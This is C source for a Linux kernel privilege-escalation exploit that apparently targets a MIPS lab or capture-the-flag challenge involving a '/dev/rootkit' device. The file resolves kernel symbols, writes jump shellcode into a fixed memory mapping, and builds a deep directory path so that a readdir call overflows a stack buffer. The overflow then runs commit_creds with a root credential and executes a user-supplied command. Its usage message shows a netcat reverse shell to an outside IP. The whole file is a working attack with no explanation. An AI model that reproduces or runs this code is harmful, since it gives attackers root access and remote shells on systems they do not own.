#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/syscall.h>

#define UMH_WAIT_PROC 2
#define GFP_ATOMIC 0x80000u

typedef int (* _commit_creds)(unsigned long cred);
typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);
typedef char * (* _call_usermodehelper_setup)(char * path, char **argv, char ** envp, int gfp_mask);
typedef int (* _call_usermodehelper_exec)(char *sub_info, int wait);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
_call_usermodehelper_setup call_usermodehelper_setup;
_call_usermodehelper_exec call_usermodehelper_exec;

static char *cmd;

/* thanks spender... */
static unsigned long get_kernel_sym(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	int ret;
	int rep = 0;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		goto fallback;
	}

repeat:
	ret = 0;
	while(ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			fprintf(stdout, " [+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");
			fclose(f);
			return addr;
		}
	}

	fclose(f);
	if (rep)
	{
		fprintf(stdout, " [-] Failed to resolve %s :(\n", name);
		return 0;
	}
fallback:
	sprintf(sname, "/boot/System.map");
	f = fopen(sname, "r");
	if (f == NULL)
	{
		fprintf(stdout, "Failed to open /boot/System.map\n");
		return 0;
	}
	rep = 1;
	goto repeat;
}

static void
getroot(void)
{
	char *sub_info;
	char *argv[] = {"/bin/sh", "-c", cmd,  NULL};

	static char *envp[] = {
		"HOME=/root",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
	};

	commit_creds(prepare_kernel_cred(0));
	sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC);

	call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
}

int main(int argc, char **argv)
{
	char *payload;
	int offset;
	DIR *d;
	int fd;
	struct dirent *dir;
	short *shellcode;
	char dirname[101];
	int i;
	const char homedir[] = "/home/pwner";

	if (argc != 2) {
		printf("Usage: %s <command>\n\n", argv[0]);
		printf("Ex: %s 'nc 192.168.2.22 1337 -e /bin/sh'\n", argv[0]);
		printf("    Kernel will panic after the command is executed :-)\n");
		return 1;
	}

	cmd = argv[1];

	printf("[+] Resolving kernel addresses...\n");

	commit_creds = (_commit_creds) get_kernel_sym("commit_creds");
	prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");
	call_usermodehelper_setup = (_call_usermodehelper_setup) get_kernel_sym("call_usermodehelper_setup");
	call_usermodehelper_exec = (_call_usermodehelper_exec) get_kernel_sym("call_usermodehelper_exec");

	if(!commit_creds || !prepare_kernel_cred ||
	   !call_usermodehelper_exec || !call_usermodehelper_setup)
	{
		printf("[-] Failed to resolve kernel symbols.\n");
		return -1;
	}

	/* Mmap payload */

	printf("[+] mmap the payload...\n");
	payload = mmap((void *) 0x61620000, 0x11000,
	               PROT_READ | PROT_WRITE | PROT_EXEC,
	               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

	if ((long)payload == -1) {
		printf("[-] Failed to mmap() at target address.\n");
		return -1;
	}

	memset(payload, 0, 0x11000);

	shellcode = (short*)(payload + 0x6364 + 0x1000);

	printf("[+] Writting jump shellcode @ %#x\n", shellcode);

	// lui $8, $8, 0x4344 -> "\x3c\x08\x41\x42"

	*shellcode++ = 0x3c08;
	*shellcode++ = (unsigned)(&getroot) >> 16;

	// ori $8, $8, 0x4344 -> "\x35\x08\x43\x44"

	*shellcode++ = 0x3508;
	*shellcode++ = (unsigned)(&getroot) & 0xffff;

	// addiu ra, $8, 0 -> "\x25\x1f\x00\x00"

	*shellcode++ = 0x251f;
	*shellcode++ = 0x0000;

	// jr ra -> "\x03\xe0\x00\x08"

	*shellcode++ = 0x03e0;
	*shellcode++ = 0x0008;

	printf("[+] Create directories...\n");

	chdir(homedir);

	strcpy(dirname, "abc");
	mkdir(dirname, 0777);
	chdir(dirname);

	strcpy(dirname, "abcd");

	for (i = sizeof(homedir) + 4; i < 560; i += 5) {
		mkdir(dirname, 0777);
		chdir(dirname);
	}

	printf("[+] Hide /home...\n");

	if ((fd = open("/dev/rootkit", O_RDWR)) == -1) {
		printf("[-] Cannot open /dev/rooktit\n");
	}
	write(fd, "+/home", sizeof("+/home"));
	close(fd);

	printf("[+] Trigger stack buffer overflow ...\n");

	d = opendir(".");
	dir = readdir(d);

	/* Will never get there... */

	if (getuid()) {
		printf("[-] Exploit failed to get root.\n");
		return -1;
	}

	printf("[+] Got root!\n");
	execl("/bin/sh", "sh", NULL);;

	return 0;
}
